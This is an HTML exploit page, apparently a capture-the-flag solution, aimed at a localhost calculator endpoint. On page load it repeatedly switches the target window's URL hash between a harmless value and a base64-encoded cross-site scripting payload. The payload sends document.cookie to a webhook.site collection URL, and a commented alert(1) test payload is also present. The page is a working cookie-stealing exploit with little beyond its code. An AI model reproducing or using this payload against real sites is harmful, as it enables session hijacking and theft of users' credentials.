<!DOCTYPE html>
<html lang="en">

<head>
    <title>exploit</title>
    <script>
        function sleep(ms) {
            return new Promise((r) => setTimeout(r, ms));
        }

        async function general(win) {
            win.location = "http://localhost:8000/api/calculate.php#MSsx";
        }
        async function xss(win) {
            // win.location = "http://localhost:8000/api/calculate.php#PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg";//
            win.location = "http://localhost:8000/api/calculate.php#ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vd2ViaG9vay5zaXRlL2M3NGE5NGM5LTY1YzctNGU1Zi1hODNmLTg1YjU3MDM2YmY4OS8/cD0iK2RvY3VtZW50LmNvb2tpZQ==";
        }

        async function modifyLocationHash() {
            var url = "http://localhost:8000/api/calculate.php";
            var win = window.open(url);
            await sleep(2000);

            for (let i = 0; i < 10000; i++) {
                general(win);
                await sleep(2);
                xss(win);
                await sleep(2);
            }
        }
    </script>
</head>

<body onload="modifyLocationHash()">
    <!-- <button onclick="modifyLocationHash()"></button> -->
</body>

</html>